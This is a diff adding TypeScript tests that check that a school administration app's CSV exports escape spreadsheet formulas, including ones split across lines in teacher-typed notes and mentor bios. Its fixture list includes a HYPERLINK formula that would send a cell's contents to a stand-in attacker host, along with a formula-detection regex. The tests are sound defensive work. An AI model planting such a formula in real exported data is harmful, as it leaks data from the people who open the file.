@@ -28,6 +28,7 @@ import { actAs, fixture } from "./_admin-fixture.js";
 const skip = needsDatabase();
 const Papa = createRequire(new URL("../../apps/web/package.json", import.meta.url))("papaparse") as {
   parse: (s: string, o: { header: boolean; skipEmptyLines: boolean }) => { data: Record<string, string>[] };
+  unparse: (d: { fields: string[]; data: Record<string, unknown>[] }, o: object) => string;
 };
 
 const FORMULA = /^[=+\-@\t\r]/;
@@ -127,6 +128,87 @@ test("the learners and mentors exports escape formulae too", { skip }, async () 
       assert.equal(m.status, 200);
       const mcsv = await m.text();
       assert.match(mcsv, new RegExp(`M ${t}`));
+      assert.deepEqual(liveFormulaCells(mcsv), [], "mentors export");
+    } finally {
+      await f.cleanup();
+    }
+  });
+});
+
+// ── A FORMULA ON ITS OWN LINE OF A MULTI-LINE CELL ───────────────────────────
+//
+// PapaParse's `escapeFormulae: true` tests /^[=+\-@\t\r].*$/, and `.` does not
+// match a newline: a cell that starts with = and has a line break anywhere in it
+// FAILED the test and was written raw. The exports carry free text a teacher
+// types through a textarea (a session's notes, a pairing's concept note, a
+// mentor's bio), so a teacher could plant `=HYPERLINK(` + newline + ... in a
+// file an administrator opens in a spreadsheet. Only the first character decides.
+
+const MULTILINE = [
+  '=HYPERLINK(\n"https://audit-evil.invalid/?leak="&C2,"click")',
+  "+1\nx",
+  "@SUM(1)\ny",
+  "-2\n3",
+  "\tcmd\nx",
+  "=1+1\r\nsecond line",
+];
+
+test("a multi-line cell that starts like a formula is escaped, and the import undoes it", async () => {
+  const { CSV_EXPORT_OPTIONS, unescapeFormulaCell } = await import("../../apps/web/src/admin/csv-safety.ts");
+  const csv = Papa.unparse({ fields: ["id", "notes"], data: MULTILINE.map((notes, i) => ({ id: String(i), notes })) }, CSV_EXPORT_OPTIONS);
+  const back = Papa.parse(csv, { header: true, skipEmptyLines: true }).data;
+  assert.equal(back.length, MULTILINE.length);
+  assert.deepEqual(liveFormulaCells(csv), [], "a cell reaches the spreadsheet as a formula");
+  for (const [i, notes] of MULTILINE.entries()) {
+    assert.equal(back[i]!.notes, `'${notes}`, `escaped with the leading apostrophe: ${JSON.stringify(notes)}`);
+    assert.equal(unescapeFormulaCell(back[i]!.notes!), notes, "and the import gives the typed text back");
+  }
+});
+
+test("a multi-line cell whose FIRST character is safe is left as typed", async () => {
+  const { CSV_EXPORT_OPTIONS } = await import("../../apps/web/src/admin/csv-safety.ts");
+  // A formula on a later line is text to a spreadsheet; an apostrophe there would grow on every round trip.
+  const notes = "Lesson went well\n=1+1 was the starter\n-2 as a negative";
+  const csv = Papa.unparse({ fields: ["notes"], data: [{ notes }] }, CSV_EXPORT_OPTIONS);
+  assert.equal(Papa.parse(csv, { header: true, skipEmptyLines: true }).data[0]!.notes, notes);
+});
+
+test("the sessions and mentors exports escape a multi-line formula a teacher or mentor typed", { skip }, async () => {
+  const generic = await import("../../apps/web/src/app/api/admin/data/[entity]/export/route.ts");
+  const mentors = await import("../../apps/web/src/app/api/admin/data/mentors/export/route.ts");
+  await withClient(async (c) => {
+    const t = tag("csv-multiline");
+    const f = fixture(c, t);
+    try {
+      const district = await f.row("districts", { name: `D ${t}`, code: t.slice(-12) });
+      const zone = await f.row("zones", { district_id: district, name: `Z ${t}` });
+      const school = await f.row("schools", { zone_id: zone, name: `S ${t}`, code: t.slice(-12) });
+      const klass = await f.row("classes", { school_id: school, grade: 4, stage: "Primary" });
+      const subject = await f.row("subjects", { name: `Subj ${t}`, code: t.slice(-12) });
+      const teacher = await f.row("teachers", { school_id: school, full_name: `Tea ${t}` });
+      await f.row("sessions", {
+        school_id: school,
+        class_id: klass,
+        subject_id: subject,
+        teacher_id: teacher,
+        scheduled_date: "2026-10-05",
+        topic: `Topic ${t}`,
+        notes: MULTILINE[0],
+      });
+      await f.row("mentors", { name: `M ${t}`, bio: MULTILINE[1] });
+      actAs(await f.user("super_admin", "sadmin"), "super_admin");
+
+      const s = await generic.GET(new Request("http://x/api/admin/data/sessions/export"), { params: Promise.resolve({ entity: "sessions" }) });
+      assert.equal(s.status, 200);
+      const scsv = await s.text();
+      const mine = Papa.parse(scsv, { header: true, skipEmptyLines: true }).data.filter((r) => r.topic === `Topic ${t}`);
+      assert.equal(mine[0]?.notes, `'${MULTILINE[0]}`, "the notes column is exported, escaped");
+      assert.deepEqual(liveFormulaCells(scsv), [], "sessions export");
+
+      const m = await mentors.GET(new Request("http://x/api/admin/data/mentors/export"));
+      assert.equal(m.status, 200);
+      const mcsv = await m.text();
+      assert.equal(Papa.parse(mcsv, { header: true, skipEmptyLines: true }).data.find((r) => r.name === `M ${t}`)?.bio, `'${MULTILINE[1]}`);
       assert.deepEqual(liveFormulaCells(mcsv), [], "mentors export");
     } finally {
       await f.cleanup();
